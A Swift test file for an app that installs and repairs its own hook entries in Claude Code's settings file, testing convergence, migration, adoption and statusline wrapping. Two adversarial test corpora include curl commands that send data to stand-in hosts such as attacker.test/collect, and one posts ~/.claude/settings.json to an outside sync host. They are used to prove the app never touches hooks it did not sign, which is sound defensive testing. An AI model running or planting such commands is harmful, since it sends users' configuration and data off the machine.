//
//  ReconcileTests.swift · Tests/DeckCoreTests
//
//  Connecting the deck, from every state a settings file can be in.
//
//  The property under test is CONVERGENCE: run it any number of times, from
//  anywhere, and land on the same correct configuration having touched only
//  what was wrong. That is what lets one control be the connect button, the
//  repair button and the duplicate cleanup at once — and what lets the deck
//  report "already connected" by computing it from the file rather than
//  remembering it in a preference that can drift.
//

import Testing
import DeckCore

struct ReconcileTests {

    private static let port = 8765

    /// The hook entries for an event. `arrayOf` is DeckCore's own and stays
    /// internal; a test reaching past the public surface would be testing a
    /// shape nobody outside the module can rely on.
    private func entries(_ document: JSONValue, _ event: String = "PreToolUse") -> [JSONValue] {
        guard case .array(let list)? = document["hooks"]?[event] else { return [] }
        return list
    }

    /// The shell command a hook entry runs.
    private func command(of entry: JSONValue?) -> String {
        guard case .array(let hooks)? = entry?["hooks"], let first = hooks.first else { return "" }
        return first["command"]?.stringValue ?? ""
    }

    private func isMarked(_ entry: JSONValue) -> Bool {
        entry[SettingsMerge.marker] == .bool(true)
    }

    private func reconcile(_ document: JSONValue, port: Int = ReconcileTests.port,
                           addStatusline: Bool = false) -> Reconciliation {
        SettingsMerge.reconcile(document, port: port, addStatusline: addStatusline)
    }

    /// A hook somebody wrote by hand, before this app could write it for them.
    /// Deliberately the OLD broken shape: single-quoted, so `${CMUX_SURFACE_ID}`
    /// never expanded and every lane was unroutable, and with no `|| true`, so
    /// a closed deck turned every Bash call into a reported hook error.
    private static let handRolled = JSONValue.object([
        "hooks": .object([
            "PreToolUse": .array([.object([
                "matcher": .string("*"),
                "hooks": .array([.object([
                    "type": .string("command"),
                    "command": .string("curl -s -X POST --data-binary @- "
                                       + "'http://127.0.0.1:8765/hook?surface=${CMUX_SURFACE_ID:-}'"),
                ])]),
            ])]),
        ]),
    ])

    /// Somebody else's hook, which the deck may never touch.
    private static let foreign = JSONValue.object([
        "matcher": .string("Bash"),
        "hooks": .array([.object([
            "type": .string("command"),
            "command": .string("~/bin/audit-log.sh"),
        ])]),
    ])

    // ---------------------------------------------------------- convergence

    /// **The property.** Connecting twice changes nothing the second time.
    @Test("connecting is idempotent")
    func connectingTwiceIsANoOp() {
        let once = reconcile(.object([:])).diff.after
        let twice = reconcile(once)
        #expect(twice.isNoOp,
                Comment(rawValue: "a second connect still wants to: \(twice.steps)"))
        #expect(twice.steps.isEmpty)
        #expect(twice.diff.after == once)
    }

    // ------------------------------------------------------- PostToolUse matcher

    /// **The matcher itself — the whole point of registering `PostToolUse`
    /// scoped rather than open.** Every other event stays `"*"`; only this
    /// one names a tool, and it names the SAME one `HoldPolicy.needsAHuman`
    /// already gates a question hold's own opening on.
    @Test("PostToolUse installs scoped to AskUserQuestion; every other event stays open")
    func postToolUseMatcherIsScopedToTheQuestionTool() {
        let connected = reconcile(.object([:])).diff.after
        let postToolUse = entries(connected, "PostToolUse")
        #expect(postToolUse.count == 1)
        #expect(postToolUse.first?["matcher"] == .string("AskUserQuestion"),
                Comment(rawValue: "PostToolUse installed with matcher \(postToolUse.first?["matcher"] as Any) "
                        + "— every OTHER tool's completion would reach the deck too"))

        for event in Self.allManagedEvents where event != "PostToolUse" {
            let matcher = entries(connected, event).first?["matcher"]
            #expect(matcher == .string("*"),
                    Comment(rawValue: "\(event) installed with matcher \(matcher as Any), not \"*\""))
        }
    }

    /// **Idempotence, specifically for the entry whose matcher is not
    /// `"*"`.** A repair pass that failed to recognise the scoped matcher
    /// would see a "foreign" `"*"`-less entry and either duplicate it or
    /// churn it on every single reconcile — this is the direct test that
    /// does not happen.
    @Test("a PostToolUse entry converges to a fixed point, signed or stripped")
    func postToolUseConvergesToAFixedPoint() {
        let connected = reconcile(.object([:])).diff.after
        let signedAgain = reconcile(connected)
        #expect(signedAgain.isNoOp,
                Comment(rawValue: "a second connect still wants to touch PostToolUse: \(signedAgain.steps)"))

        let stripped = strippedByAClaudeCodeSave(connected)
        #expect(entries(stripped, "PostToolUse").first?["matcher"] == .string("AskUserQuestion"),
                "the matcher is schema-valid on the entry, not the marker — a save has no reason to strip it")
        let repaired = reconcile(stripped)
        #expect(entries(repaired.diff.after, "PostToolUse").count == 1,
                "a marker-stripped, tool-scoped PostToolUse entry was not recognised and got duplicated")
        #expect(reconcile(repaired.diff.after).isNoOp,
                Comment(rawValue: "the repaired PostToolUse entry does not converge: \(reconcile(repaired.diff.after).steps)"))
    }

    /// Uninstalling removes the scoped entry the same as every `"*"` one —
    /// `uninstall` walks `allEvents` generically and never reads a matcher,
    /// but this is the direct proof rather than an inference from that.
    @Test("disconnecting removes the PostToolUse entry too")
    func disconnectingRemovesPostToolUse() {
        let connected = reconcile(.object([:])).diff.after
        let disconnected = SettingsMerge.uninstall(from: connected)
        #expect(entries(disconnected.after, "PostToolUse").isEmpty)
    }

    /// And a deck already connected says so without writing — which is how the
    /// empty state reports its own status rather than trusting a preference.
    @Test("an already-connected file reports no work to do")
    func alreadyConnectedIsRecognised() {
        let connected = reconcile(.object([:])).diff.after
        #expect(reconcile(connected).isNoOp)
        #expect(SettingsMerge.isInstalled(connected))
        #expect(SettingsMerge.installedPort(connected) == Self.port)
    }

    /// **The consent flow the Settings picker rides on.** Changing the hold
    /// budget does not write anything by itself — `DeckRuntime.setPrefs`
    /// persists the preference immediately, and the INSTALLED file only
    /// drifts from it until somebody presses Connect or Repair, same as any
    /// other drift `Reconciliation` already surfaces. So: the file installed
    /// under one budget reconciles to a real diff against a different one,
    /// that diff actually carries the new numbers, reconciling again with
    /// the SAME new policy is a no-op, and reconciling the ORIGINAL file
    /// against the policy it was actually written with was always a no-op —
    /// a budget change is not special-cased, it is the same convergence
    /// every other drift in this file already gets.
    @Test("reconciling after a budget change produces a diff; reconciling again converges")
    func budgetChangeReconcilesThenConverges() {
        let installed = reconcile(.object([:])).diff.after      // .spec — 120 s, 130 s installed
        #expect(reconcile(installed).isNoOp, "the fixture itself is not settled at .spec")

        let longer = HoldPolicy(budget: Millis(300_000), armDelay: Millis(250), reArmDelay: Millis(400))
        let changed = SettingsMerge.reconcile(installed, port: Self.port, policy: longer)
        #expect(!changed.isNoOp, "a real budget change (120 s -> 300 s) reconciled to nothing")
        #expect(command(of: entries(changed.diff.after, "PermissionRequest").first)
                    .contains("--max-time 305 "),
                "the repaired file did not carry the new budget's own curl ceiling")

        #expect(SettingsMerge.reconcile(changed.diff.after, port: Self.port, policy: longer).isNoOp,
                "reconciling the repaired file against the same policy still wanted work")
        // The ORIGINAL file was already settled for the policy that wrote
        // it — `reconcile`'s own default — so nothing above was a special
        // case for the budget being different, only for it being checked.
        #expect(SettingsMerge.reconcile(installed, port: Self.port).isNoOp)
    }

    // ----------------------------------------------- signed, or asked about

    /// **Nothing the deck did not sign is ever modified.**
    ///
    /// One assertion in place of a corpus of adversarial strings, because the
    /// question changed. It used to be "which of these commands looks like
    /// ours", and that was answered wrongly four times running — each fix
    /// closing one mechanism and leaving the next, until a review pointed out
    /// that `curl` takes a destination with no scheme at all and no amount of
    /// substring counting can separate a request target from data.
    ///
    /// Every command below defeated some version of that guessing. They are
    /// kept as a corpus because they are real, and because a rule that only
    /// touches what it signed makes all of them the same case.
    @Test("no unsigned hook is ever rewritten", arguments: [
        // Each of these was claimed by some version of the recogniser.
        #"curl -s -X POST -d "surface=prod" http://127.0.0.1:9000/hook"#,
        #"curl -s -X POST "http://127.0.0.1:9000/hook?resurface=true""#,
        #"curl -s -X POST "http://127.0.0.1:9000/hook?id=1#a=1&surface=prod""#,
        #"curl -s -X POST "http://127.0.0.1:9000/hook?debug&surface""#,
        #"curl -d "redirect=http://127.0.0.1:8765/hook?surface=x" http://elsewhere.test/r"#,
        // The four a scheme-counting rule could not see, because the real
        // destination carries no scheme.
        #"curl -d "redirect=http://127.0.0.1:8765/hook?surface=x" attacker.test/collect"#,
        #"curl --data-urlencode "p=http://127.0.0.1:8765/hook?surface=leak" attacker.test/c"#,
        #"curl -d "redirect=http://127.0.0.1:8765/hook?surface=x" "$BACKUP_ENDPOINT""#,
        #"curl -s -X POST --data "$(cat ~/.claude/settings.json)" https://sync.test/backup"#,
        // And ordinary hooks that were never in danger.
        #"~/bin/audit-tool-use.sh"#,
        #"curl -X POST https://hooks.slack.com/services/XXX -d @-"#,
    ])
    func noUnsignedHookIsTouched(_ command: String) {
        let entry = JSONValue.object([
            "matcher": .string("*"),
            "hooks": .array([.object(["type": .string("command"),
                                      "command": .string(command)])]),
        ])
        let after = reconcile(.object(["hooks": .object(["PreToolUse": .array([entry])])])).diff.after
        #expect(entries(after).contains(entry),
                Comment(rawValue: "the deck rewrote a hook it did not sign: \(command)"))
    }

    /// A hook that MIGHT be the deck's is surfaced with its command, so the
    /// one party who knows can say. Loose on purpose: offering to adopt
    /// something that turns out not to be the deck's costs a question, and
    /// missing one costs the duplicate this exists to prevent.
    @Test("an unsigned hook that mentions the deck's route is offered for adoption")
    func deckShapedHooksBecomeCandidates() {
        let command = #"curl -X POST --data-binary @- "http://localhost:8765/hook?surface=$S""#
        let entry = JSONValue.object([
            "matcher": .string("*"),
            "hooks": .array([.object(["type": .string("command"),
                                      "command": .string(command)])]),
        ])
        let result = reconcile(.object(["hooks": .object(["PreToolUse": .array([entry])])]))
        #expect(result.candidates.contains(command),
                Comment(rawValue: "not offered: \(result.candidates)"))
        // And still untouched until somebody says so.
        #expect(entries(result.diff.after).contains(entry))
    }

    /// Saying so adopts it: signed, converged, and repaired. The hand-written
    /// form in this fixture is the one this project shipped three defects in —
    /// single-quoted so `${CMUX_SURFACE_ID}` never expanded, no `|| true`, so
    /// a closed deck reported an error on every call.
    @Test("adopting a candidate signs it and repairs it")
    func adoptingACandidateRepairsIt() {
        let handRolled = #"curl -s -X POST --data-binary @- 'http://127.0.0.1:8765/hook?surface=${CMUX_SURFACE_ID:-}'"#
        let entry = JSONValue.object([
            "matcher": .string("*"),
            "hooks": .array([.object(["type": .string("command"),
                                      "command": .string(handRolled)])]),
        ])
        let document = JSONValue.object(["hooks": .object(["PreToolUse": .array([entry])])])
        let after = SettingsMerge.reconcile(document, port: Self.port,
                                            adopting: [handRolled]).diff.after

        #expect(entries(after).count == 1,
                Comment(rawValue: "adopting left \(entries(after).count) hooks, so every tool "
                        + "call posts to the deck more than once"))
        let command = command(of: entries(after).first)
        #expect(command.contains("|| true"),
                "the adopted hook still reports an error whenever the deck is closed")
        #expect(!command.contains("'http://"),
                "the adopted hook is still single-quoted, so ${CMUX_SURFACE_ID} never expands")
        #expect(SettingsMerge.installedPort(after) == Self.port)
    }

    /// **The candidate scan must not miss `PermissionRequest`.** It used to
    /// look at `PreToolUse` alone, so a deck-shaped hook sitting under any
    /// other event — `PermissionRequest` chief among them, since it is the
    /// event this whole feature is about — was never offered for adoption.
    /// The shape here is the one seen in the wild: an OBSERVER command (no
    /// widened `--max-time`, nothing held-specific about it) sitting in the
    /// HELD slot with a stray `"timeout": 120` beside it — an old or
    /// hand-rolled install, never converged. Adopting it must fold to ONE
    /// `PermissionRequest` entry, not sign the wrong-shaped one in place and
    /// leave a second, correctly-shaped one to post beside it.
    @Test("an unsigned deck-shaped PermissionRequest hook is offered, and adopting it folds to one entry")
    func permissionRequestCandidateAdoptsCleanly() {
        let connected = reconcile(.object([:])).diff.after
        let observerCommand = command(of: entries(connected, "Notification").first)

        let strayEntry = JSONValue.object([
            "matcher": .string("*"),
            "hooks": .array([.object([
                "type": .string("command"),
                "command": .string(observerCommand),
                "timeout": .number(120),
            ])]),
        ])
        let document = JSONValue.object(["hooks": .object(["PermissionRequest": .array([strayEntry])])])

        let offer = reconcile(document)
        #expect(offer.candidates.contains(observerCommand),
                Comment(rawValue: "not offered from PermissionRequest: \(offer.candidates)"))

        let after = SettingsMerge.reconcile(document, port: Self.port,
                                            adopting: [observerCommand]).diff.after
        let permissionRequestEntries = entries(after, "PermissionRequest")
        #expect(permissionRequestEntries.count == 1,
                Comment(rawValue: "adopting left \(permissionRequestEntries.count) PermissionRequest "
                        + "entries, so the event posts to the deck more than once"))
        #expect(isMarked(permissionRequestEntries[0]))
        #expect(permissionRequestEntries[0] == entries(connected, "PermissionRequest")[0],
                "the adopted entry did not converge to the same held shape a fresh install writes")
        #expect(reconcile(after).isNoOp, "adopting did not reach a fixed point")
    }

    // ------------------------------------------- the writer that strips keys

    /// What a Claude Code save does to the deck's work: every key outside its
    /// schema is dropped on re-serialisation — the marker and the
    /// statusline's kept original, at the top of each entry / statusLine
    /// object. The commands survive, so the installation keeps working; only
    /// the deck's ability to recognise it used to die.
    ///
    /// `fields.removeValue(forKey: "timeout")` strips an ENTRY-level key —
    /// which is where the old, pre-chunk-2 `deckEntry` wrote its (buggy,
    /// out-of-schema) budget, and is where a real Claude Code save strips
    /// from too. It does not reach inside `fields["hooks"]`, so a held
    /// event's PER-COMMAND `timeout` — schema-valid, and where the budget
    /// lives now — is never touched: this already simulates "a Claude Code
    /// save keeps a schema-valid key" correctly, for both the old shape (no
    /// entry-level timeout to strip once it is gone) and the new one (a
    /// per-command timeout the strip never reaches).
    private func strippedByAClaudeCodeSave(_ document: JSONValue) -> JSONValue {
        guard case .object(var root) = document else { return document }
        if case .object(var hooks)? = root["hooks"] {
            for (event, list) in hooks {
                guard case .array(let entries) = list else { continue }
                hooks[event] = .array(entries.map { entry in
                    guard case .object(var fields) = entry else { return entry }
                    fields.removeValue(forKey: SettingsMerge.marker)
                    fields.removeValue(forKey: "timeout")
                    return .object(fields)
                })
            }
            root["hooks"] = .object(hooks)
        }
        if case .object(var line)? = root["statusLine"] {
            line.removeValue(forKey: SettingsMerge.marker)
            line.removeValue(forKey: SettingsMerge.original)
            root["statusLine"] = .object(line)
        }
        return .object(root)
    }

    /// Every event the deck manages today, held pair first — the eight-event
    /// target topology this chunk installs. `PostToolUse` joined the
    /// original seven as the question-mirror arc's own addition.
    private static let allManagedEvents = ["PermissionRequest", "PreToolUse", "Notification",
                                           "UserPromptSubmit", "SessionStart", "Stop", "SessionEnd",
                                           "PostToolUse"]

    /// **A Claude Code save does not disconnect the deck.** The stripped entry
    /// is byte-for-byte the deck's own writing, and equality with the writer —
    /// not a string heuristic — is what identifies it. Fixed-point over all
    /// eight events, signed and stripped: a fresh install ("new-signed") and
    /// what a save leaves of it ("new-stripped") both converge and stay
    /// converged. `PostToolUse`'s own stripped shape carries a DIFFERENT
    /// matcher than the other seven (`SubjectReader.questionTool`, not
    /// `"*"`) — this loop is what proves `canonicalPort`'s extra candidate
    /// shape (`Reconcile.swift`) actually recognises it post-strip, not just
    /// pre-strip.
    @Test("a marker-stripped installation is still recognised and converged")
    func aStrippedFileIsStillTheDecks() {
        let connected = reconcile(.object([:])).diff.after
        #expect(reconcile(connected).isNoOp, "a freshly signed eight-event install still wants work")
        let stripped = strippedByAClaudeCodeSave(connected)

        #expect(SettingsMerge.isInstalled(stripped),
                "one Claude Code save and the deck forgets it was ever connected")
        #expect(SettingsMerge.installedPort(stripped) == Self.port)

        let repaired = reconcile(stripped)
        for event in Self.allManagedEvents {
            #expect(entries(repaired.diff.after, event).count == 1,
                    Comment(rawValue: "\(event): re-signing left "
                            + "\(entries(repaired.diff.after, event).count) entries, so it posts "
                            + "to the deck more than once"))
            #expect(isMarked(entries(repaired.diff.after, event)[0]),
                    Comment(rawValue: "\(event): still unsigned after the repair"))
        }
        #expect(repaired.steps.contains { $0.contains("Re-sign") },
                Comment(rawValue: "what happened is not what is said: \(repaired.steps)"))
        #expect(reconcile(repaired.diff.after).isNoOp, "the repair did not converge")
    }

    /// **Migration**: a machine still running the OLD two-event install —
    /// `PreToolUse` and `Notification` only, with the pre-chunk-2 entry-level
    /// millisecond `timeout` — converges to the full eight-event set,
    /// whether or not a Claude Code save had already stripped it
    /// ("old-signed" and "old-stripped"). `PermissionRequest` and
    /// `PostToolUse` each get a sentence that says what they ARE, not just
    /// that they were added — silently registering the events the hold
    /// feature and the question-mirror retirement path depend on would be
    /// the kind of upgrade nobody notices until Allow, or an answered
    /// question's mirror, stops working on a machine that looks connected.
    @Test("an old two-event install migrates to the eight-event set, signed or stripped")
    func oldTwoEventInstallMigrates() {
        let oldObserverCommand = #"curl -s --max-time 5 -X POST --data-binary @- "http://127.0.0.1:8765/hook?surface=${CMUX_SURFACE_ID:-}&workspace=${CMUX_WORKSPACE_ID:-}" || true"#
        // The pre-chunk-2 `PreToolUse` entry carried its budget at the ENTRY
        // level, in milliseconds — the bug this chunk fixes — while
        // `Notification` never carried one at all. Exactly the shape a
        // machine that installed before this change is still running.
        let oldSigned = JSONValue.object([
            "hooks": .object([
                "PreToolUse": .array([.object([
                    SettingsMerge.marker: .bool(true),
                    "matcher": .string("*"),
                    "timeout": .number(120_000),
                    "hooks": .array([.object(["type": .string("command"),
                                              "command": .string(oldObserverCommand)])]),
                ])]),
                "Notification": .array([.object([
                    SettingsMerge.marker: .bool(true),
                    "matcher": .string("*"),
                    "hooks": .array([.object(["type": .string("command"),
                                              "command": .string(oldObserverCommand)])]),
                ])]),
            ]),
        ])

        for (label, before) in [("signed", oldSigned),
                                ("stripped", strippedByAClaudeCodeSave(oldSigned))] {
            let migrated = reconcile(before)
            for event in Self.allManagedEvents {
                #expect(entries(migrated.diff.after, event).count == 1,
                        Comment(rawValue: "\(label): \(event) has "
                                + "\(entries(migrated.diff.after, event).count) entries"))
            }
            #expect(migrated.steps.contains { $0.contains("Register the PermissionRequest hook") },
                    Comment(rawValue: "\(label): steps did not explain the new event: \(migrated.steps)"))
            #expect(reconcile(migrated.diff.after).isNoOp,
                    Comment(rawValue: "\(label): migration did not converge to a fixed point"))
        }
    }

    /// And a stripped WRAP is still a wrap. Reading the composed relay as the
    /// user's own command would nest a relay around a relay on every
    /// reconnect after every Claude Code save. Recognised by equality with its
    /// writer, the stripped relay is already right, so it is left alone — and
    /// the original it carries still comes back out on disconnect.
    @Test("a marker-stripped statusline relay is not wrapped again")
    func aStrippedRelayIsNotReWrapped() {
        let mine = "~/bin/my-statusline.sh --fancy"
        let document = JSONValue.object([
            "statusLine": .object(["type": .string("command"), "command": .string(mine)]),
        ])
        let stripped = strippedByAClaudeCodeSave(reconcile(document).diff.after)
        let after = reconcile(stripped).diff.after

        let composed = after["statusLine"]?["command"]?.stringValue ?? ""
        #expect(composed.components(separatedBy: "mktemp").count == 2,
                "the relay is nested inside itself")
        #expect(SettingsMerge.wrapsOriginal(after, original: mine),
                "the user's statusline stopped rendering")
        #expect(SettingsMerge.uninstall(from: after).after["statusLine"]?["command"]?.stringValue
                == mine,
                "the marker went, and the user's command could not be given back")
    }

    /// **Equality is not recognition.** Every command in the adversarial
    /// corpus above defeated some version of a string-matcher; none of them
    /// can pass an `==` against the deck's own writer, so none of them reads
    /// as installed.
    @Test("no adversarial command passes the equality gate", arguments: [
        #"curl -d "redirect=http://127.0.0.1:8765/hook?surface=x" attacker.test/collect"#,
        #"curl --data-urlencode "p=http://127.0.0.1:8765/hook?surface=leak" attacker.test/c"#,
        #"curl -d "redirect=http://127.0.0.1:8765/hook?surface=x" "$BACKUP_ENDPOINT""#,
        // The deck's own command with one character of drift is somebody
        // else's: identification by construction has no "close enough".
        #"curl -s --max-time 5 -X POST --data-binary @- 'http://127.0.0.1:8765/hook?surface=${CMUX_SURFACE_ID:-}&workspace=${CMUX_WORKSPACE_ID:-}' || true"#,
        #"curl -s --max-time 5 -X POST --data-binary @- "http://127.0.0.1:8765/hook?surface=${CMUX_SURFACE_ID:-}&workspace=${CMUX_WORKSPACE_ID:-}""#,
    ])
    func equalityIsNotRecognition(_ command: String) {
        let document = JSONValue.object(["hooks": .object(["PreToolUse": .array([.object([
            "matcher": .string("*"),
            "hooks": .array([.object(["type": .string("command"),
                                      "command": .string(command)])]),
        ])])])])
        #expect(!SettingsMerge.isInstalled(document),
                Comment(rawValue: "claimed as the deck's own: \(command)"))
        #expect(SettingsMerge.installedPort(document) == nil)
    }

    /// **Equality is against the WHOLE entry, not the command alone.** The
    /// deck's verbatim command, pasted into an entry of somebody else's
    /// shaping — their matcher, their extra `timeout` — is still somebody
    /// else's entry. Claiming it on the strength of the command string alone
    /// would let converge replace their matcher and uninstall delete their
    /// entry with no adoption question ever asked.
    @Test("the deck's verbatim command in somebody's own entry shape stays theirs")
    func verbatimCommandInAForeignShapeStaysForeign() {
        let canonical = command(of: entries(reconcile(.object([:])).diff.after).first)
        let entry = JSONValue.object([
            "matcher": .string("Bash"),
            "hooks": .array([.object([
                "type": .string("command"),
                "command": .string(canonical),
                "timeout": .number(30),
            ])]),
        ])
        let document = JSONValue.object(["hooks": .object(["PreToolUse": .array([entry])])])

        #expect(!SettingsMerge.isInstalled(document),
                "somebody's own entry, shaped their way, read as an installed deck hook")
        #expect(SettingsMerge.installedPort(document) == nil)
        #expect(SettingsMerge.uninstall(from: document).after == document,
                "uninstall touched an entry it does not own")
        #expect(reconcile(document).candidates.contains(canonical),
                Comment(rawValue: "not offered for adoption: \(reconcile(document).candidates)"))
    }

    // -------------------------------------------------------- what it leaves

    /// Somebody else's hooks are never touched, and never reordered.
    @Test("foreign hooks survive untouched and in place")
    func foreignHooksAreLeftAlone() {
        let document = JSONValue.object([
            "hooks": .object(["PreToolUse": .array([Self.foreign])]),
            "model": .string("opus"),
            "env": .object(["FOO": .string("bar")]),
        ])
        let after = reconcile(document).diff.after
        let entries = entries(after)

        #expect(entries.first == Self.foreign,
                "somebody else's hook was rewritten, or pushed out of first place")
        #expect(entries.count == 2)
        #expect(after["model"] == .string("opus"), "an unrelated key was lost")
        #expect(after["env"] == .object(["FOO": .string("bar")]), "an unrelated key was lost")
    }

    /// A deck hook keeps its POSITION. Hook order is the user's, and
    /// reordering somebody's configuration to make a diff tidier is exactly
    /// the helpfulness nobody asked for.
    @Test("an adopted hook stays where it was")
    func positionIsPreserved() {
        let other = JSONValue.object(["matcher": .string("Write"),
                                      "hooks": .array([.object([
                                          "type": .string("command"),
                                          "command": .string("echo second")])])])
        let handRolledEntry = entries(Self.handRolled)[0]
        let document = JSONValue.object([
            "hooks": .object(["PreToolUse": .array([Self.foreign, handRolledEntry, other])]),
        ])
        // Adopted on request — the deck no longer decides that for itself.
        let entries = entries(SettingsMerge.reconcile(document, port: Self.port,
                                                     adopting: [command(of: handRolledEntry)])
                                .diff.after)

        #expect(entries.count == 3)
        #expect(entries[0] == Self.foreign)
        #expect(isMarked(entries[1]), "the deck's hook moved out of second place")
        #expect(entries[2] == other)
    }

    // ------------------------------------------------------------ duplicates

    /// Two deck hooks converge to one. This is the state a user reaches by
    /// connecting with an older build that only matched its own marker.
    @Test("duplicate deck hooks converge to one")
    func duplicatesAreCollapsed() {
        let handRolledEntry = entries(Self.handRolled)[0]
        let document = JSONValue.object([
            "hooks": .object(["PreToolUse": .array([handRolledEntry, handRolledEntry,
                                                    Self.foreign])]),
        ])
        let result = SettingsMerge.reconcile(document, port: Self.port,
                                             adopting: [command(of: handRolledEntry)])
        let entries = entries(result.diff.after)

        #expect(entries.count == 2, Comment(rawValue: "left \(entries.count) entries"))
        #expect(entries.contains(Self.foreign))
        #expect(result.steps.contains { $0.contains("duplicate") },
                Comment(rawValue: "the removal was not explained: \(result.steps)"))
    }

    // ------------------------------------------------- shared-entry safety

    /// **The kept sibling of a split entry is unsigned, not the deck's.**
    ///
    /// Claude Code's own `/hooks` UI appends a new command into an EXISTING
    /// matcher group rather than creating its own, so a signed deck entry can
    /// end up bundling a user's command under the SAME entry. Splitting used
    /// to leave the deck's marker on the half that kept the user's command —
    /// an entry the deck no longer had any command in, still reading as
    /// signed — and every later reconcile rediscovered it as "shared" with a
    /// command that had already left, reporting Move/Update/Remove-duplicate
    /// steps against a file nothing had actually changed since the last pass.
    @Test("a split shared entry's sibling is unsigned, and a converged file stays a clean no-op")
    func sharedEntrySplitUnsignsTheSibling() {
        let connected = reconcile(.object([:])).diff.after
        let deckHook = entries(connected, "SessionEnd").first?["hooks"]?.arrayValue?.first
        precondition(deckHook != nil, "a fresh connect did not write a SessionEnd hook to build the fixture from")
        let auditCommand = "~/bin/audit.sh"
        let auditHook = JSONValue.object(["type": .string("command"), "command": .string(auditCommand)])
        let shared = JSONValue.object([
            SettingsMerge.marker: .bool(true),
            "matcher": .string("*"),
            "hooks": .array([deckHook!, auditHook]),
        ])
        let document = JSONValue.object(["hooks": .object(["SessionEnd": .array([shared])])])

        let first = reconcile(document)
        let split = entries(first.diff.after, "SessionEnd")
        #expect(split.count == 2,
                Comment(rawValue: "expected the deck's own entry plus the unsigned sibling, got \(split.count)"))
        let sibling = split.first {
            ($0["hooks"]?.arrayValue ?? []).contains { $0["command"]?.stringValue == auditCommand }
        }
        #expect(sibling != nil, "the user's audit hook did not survive the split")
        #expect(sibling.map { !isMarked($0) } == true,
                "the sibling kept the deck's marker after every one of the deck's commands left it")
        #expect(split.contains { isMarked($0) }, "the deck's own hook has nowhere signed to live")

        // The property: reconciling the converged file again is a CLEAN
        // no-op — not just diff-equal, but with nothing left for it to say.
        let second = reconcile(first.diff.after)
        #expect(second.isNoOp,
                Comment(rawValue: "a converged shared entry still wants: \(second.steps)"))
        #expect(second.steps.isEmpty,
                Comment(rawValue: "phantom steps on a file nothing had changed: \(second.steps)"))
    }

    // ----------------------------------------------------------------- drift

    /// **Port drift is repaired by the same control that connects.**
    ///
    /// A deck that could not bind 8765 and took 8766 leaves the config
    /// pointing at a port nothing is listening on, and NO SESSION EVER
    /// APPEARS. There is no separate repair flow: connecting again is it.
    @Test("connecting on a new port repairs a stale one")
    func portDriftIsRepaired() {
        let onOldPort = reconcile(.object([:]), port: 8765).diff.after
        #expect(SettingsMerge.installedPort(onOldPort) == 8765)

        let moved = reconcile(onOldPort, port: 8766)
        #expect(!moved.isNoOp, "a deck listening on a different port had nothing to fix")
        #expect(SettingsMerge.installedPort(moved.diff.after) == 8766)
        #expect(reconcile(moved.diff.after, port: 8766).isNoOp, "the repair did not converge")
    }

    // ------------------------------------------------------------ statusline

    /// An existing statusline is WRAPPED, kept verbatim, and still renders.
    @Test("an existing statusline is wrapped rather than replaced")
    func anExistingStatuslineIsWrapped() {
        let mine = "~/bin/my-statusline.sh --fancy"
        let document = JSONValue.object([
            "statusLine": .object(["type": .string("command"), "command": .string(mine)]),
        ])
        let after = reconcile(document).diff.after
        // The whole document, not the node — `wrapsOriginal` looks the key up
        // itself, and handing it the node made it search for a statusLine
        // inside a statusLine.
        #expect(SettingsMerge.wrapsOriginal(after, original: mine),
                "the user's statusline stopped rendering")
        #expect(after["statusLine"]?[SettingsMerge.original]?.stringValue == mine,
                "the original was not kept verbatim, so disconnecting cannot restore it")
    }

    /// **Creating one is opt-in and stays opt-in.**
    ///
    /// Writing a key somebody never had is a consent decision, which is why
    /// `install` refused to do it at all. It is still refused by default; what
    /// changed is that a person can now say yes.
    @Test("a statusline is only created when asked for")
    func aStatuslineIsOnlyCreatedOnRequest() {
        #expect(reconcile(.object([:])).diff.after["statusLine"] == nil,
                "the deck invented a statusline nobody asked for")

        let asked = reconcile(.object([:]), addStatusline: true)
        #expect(asked.diff.after["statusLine"] != nil)
        #expect(asked.steps.contains { $0.lowercased().contains("statusline") },
                "creating one was not explained")
        // And still idempotent with the option on.
        #expect(reconcile(asked.diff.after, addStatusline: true).isNoOp)
    }

    // ---------------------------------------------------- the old bug's damage

    /// A file written before this fix can hold `relay(relay(mine))` — the
    /// composed relay was read back as an "original" and wrapped again. One
    /// layer of unwrapping is not enough: the nesting would otherwise survive
    /// forever, and uninstall would hand back an inner relay and call it "the
    /// user's statusline".
    @Test("a relay nested by the old bug is unwound")
    func nestedRelayIsUnwound() {
        let mine = "~/bin/my-statusline.sh --fancy"
        let nested = SettingsMerge.relayCommand(
            wrapping: SettingsMerge.relayCommand(wrapping: mine, port: Self.port), port: Self.port)
        // An empty `hooks` object, present rather than absent: `uninstall`
        // only inspects the statusline once it finds a `hooks` object to
        // operate on at all, and a file carrying a deck-installed statusline
        // has necessarily been through `install`, which never writes one
        // without the other.
        let document = JSONValue.object([
            "hooks": .object([:]),
            "statusLine": .object(["type": .string("command"), "command": .string(nested)]),
        ])

        #expect(SettingsMerge.originalStatusline(document) == mine,
                "the nested relay was not unwound to the user's own command")

        let after = reconcile(document).diff.after
        let composed = after["statusLine"]?["command"]?.stringValue ?? ""
        #expect(composed.components(separatedBy: "mktemp").count == 2,
                "reconnecting on a nested file did not converge to a single wrap")
        #expect(SettingsMerge.wrapsOriginal(after, original: mine),
                "the user's statusline stopped rendering")
        #expect(reconcile(after).isNoOp, "the repair did not converge")

        #expect(SettingsMerge.uninstall(from: document).after["statusLine"]?["command"]?.stringValue
                == mine,
                "uninstall restored an inner relay instead of the user's command")
    }

    /// And a MARKED file damaged the same way converges too. The stored
    /// `original` is itself a relay here, and regenerating the wrap around it
    /// verbatim — instead of unwinding it first — would nest another layer on
    /// every reconcile rather than repairing the file.
    @Test("a damaged marked relay converges")
    func damagedMarkedRelayConverges() {
        let mine = "~/bin/my-statusline.sh --fancy"
        let onceWrapped = SettingsMerge.relayCommand(wrapping: mine, port: Self.port)
        let twiceWrapped = SettingsMerge.relayCommand(wrapping: onceWrapped, port: Self.port)
        let document = JSONValue.object([
            "statusLine": .object([
                "type": .string("command"),
                "command": .string(twiceWrapped),
                SettingsMerge.marker: .bool(true),
                SettingsMerge.original: .string(onceWrapped),
            ]),
        ])

        let after = reconcile(document).diff.after
        let composed = after["statusLine"]?["command"]?.stringValue ?? ""
        #expect(composed.components(separatedBy: "mktemp").count == 2,
                "a damaged marked file did not converge to a single wrap")
        #expect(after["statusLine"]?[SettingsMerge.original]?.stringValue == mine,
                "the stored original is still the inner relay, not the user's command")
        #expect(reconcile(after).isNoOp, "the repair did not converge")
        #expect(SettingsMerge.uninstall(from: after).after["statusLine"]?["command"]?.stringValue
                == mine,
